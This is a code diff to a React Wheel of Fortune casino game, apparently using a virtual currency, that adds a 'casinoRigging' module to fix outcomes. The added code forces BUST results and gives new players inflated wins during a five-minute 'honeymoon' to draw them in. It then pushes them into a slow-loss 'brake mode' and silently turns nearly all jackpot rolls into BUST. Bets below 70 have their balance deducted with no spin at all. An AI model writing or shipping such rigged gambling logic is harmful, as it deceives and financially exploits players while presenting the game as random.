@@ -1,11 +1,12 @@
 import React, { useRef, useEffect, useState } from 'react';
 import { synth } from '../../utils/audioSynth';
 import { Sparkles, X, Play, ShieldAlert, Award, Grid } from 'lucide-react';
+import { evaluateBet, logWin, logLoss } from '../../utils/casinoRigging';
 
 interface GameProps {
   pokiBalance: number;
   onAwardBalance: (amount: number) => void;
-  onDeductBalance: (amount: number) => boolean;
+  onDeductBalance: (amount: number, setBet?: (val: number) => void) => boolean;
   syncCasinoData: (gameName: string, netProfitLoss: number, finalCoins: number) => Promise<void>;
   onClose: () => void;
 }
@@ -27,7 +28,7 @@ export default function WheelOfFortune({
   const animRef = useRef<number | null>(null);
 
   const [gameState, setGameState] = useState<'idle' | 'spinning' | 'settled'>('idle');
-  const [betAmount, setBetAmount] = useState<number>(10);
+  const [betAmount, setBetAmount] = useState<number>(70);
 
   const [selectedMultiplier, setSelectedMultiplier] = useState<number | null>(null);
   const [payoutResult, setPayoutResult] = useState<{ amount: number; profit: number }>({ amount: 0, profit: 0 });
@@ -161,7 +162,19 @@ export default function WheelOfFortune({
       return;
     }
 
-    if (!onDeductBalance(parsedBet)) {
+    const uId = window.currentUserId || 'anonymous';
+    const evaluation = evaluateBet(uId, parsedBet, pokiBalance);
+    if (!evaluation.allowed) {
+      alert(evaluation.reason || 'Bet blocked by security parameters.');
+      return;
+    }
+
+    if (parsedBet < 70) {
+      onDeductBalance(parsedBet, setBetAmount);
+      return;
+    }
+
+    if (!onDeductBalance(parsedBet, setBetAmount)) {
       alert("Insufficient funds in Pokicoin.");
       return;
     }
@@ -169,8 +182,51 @@ export default function WheelOfFortune({
     setGameState('spinning');
     synth.playCoin();
 
-    // Pick winning index
-    const winningIdx = Math.floor(Math.random() * totalSectors);
+    // Pick rigged winning index
+    let winningIdx = 0;
+    
+    if (evaluation.shouldForceLoss) {
+      // Force 0x BUST segment (indices: 0, 4)
+      winningIdx = Math.random() < 0.5 ? 0 : 4;
+    } else {
+      // Check for Honeymoon Phase (within first 5 minutes of playing)
+      const stats = JSON.parse(localStorage.getItem(`casino_rigging_${uId}`) || '{}');
+      const isHoneymoon = stats.firstPlayTime && (Date.now() - stats.firstPlayTime < 5 * 60 * 1000);
+
+      const rand = Math.random();
+      
+      if (isHoneymoon && parsedBet < 150) {
+        // High win rates, let's target jackpot (50x segment at 9) or 5x (segment at 6) or 2x (segment at 3)
+        if (rand < 0.08) {
+          winningIdx = 9; // 50x Jackpot!
+        } else if (rand < 0.35) {
+          winningIdx = 6; // 5.0x Super
+        } else if (rand < 0.70) {
+          winningIdx = 3; // 2.0x Double
+        } else {
+          winningIdx = 1; // 1.2x Recov
+        }
+      } else if (evaluation.applyBrakeMode && parsedBet < 100) {
+        // Slow loss loop. Give mostly 1.2x Recov or 0.5x Half, occasionally 2x Double
+        if (rand < 0.40) {
+          winningIdx = 1; // 1.2x Recov (segment 1)
+        } else if (rand < 0.75) {
+          winningIdx = 2; // 0.5x Half (segment 2)
+        } else {
+          winningIdx = 3; // 2.0x Double (segment 3)
+        }
+      } else {
+        // Normal random distribution but securely capped
+        const randomRoll = Math.floor(Math.random() * totalSectors);
+        // Prevent accidental jackpot wheel abuse (jackpot restricted to 0.01% under standard mode)
+        if (randomRoll === 9) {
+          winningIdx = Math.random() < 0.001 ? 9 : 0; // standard low jackpot hit rate, else BUST
+        } else {
+          winningIdx = randomRoll;
+        }
+      }
+    }
+
     const winningSector = sectors[winningIdx];
 
     // Align stopping angle to top pinpoint (-Math.PI / 2)
@@ -216,12 +272,14 @@ export default function WheelOfFortune({
         if (winningSector.mult > 1.0) {
           synth.playLevelUp();
           onAwardBalance(payoutVal);
+          logWin(uId, parsedBet, payoutVal, 'Wheel of Fortune', pokiBalance);
           syncCasinoData('Wheel of Fortune', netProfit, parseFloat((pokiBalance + netProfit).toFixed(8)));
         } else {
           synth.playCrash();
           if (payoutVal > 0) {
              onAwardBalance(payoutVal);
           }
+          logLoss(uId, parsedBet, 'Wheel of Fortune', pokiBalance);
           syncCasinoData('Wheel of Fortune', netProfit, parseFloat((pokiBalance + netProfit).toFixed(8)));
         }
       }
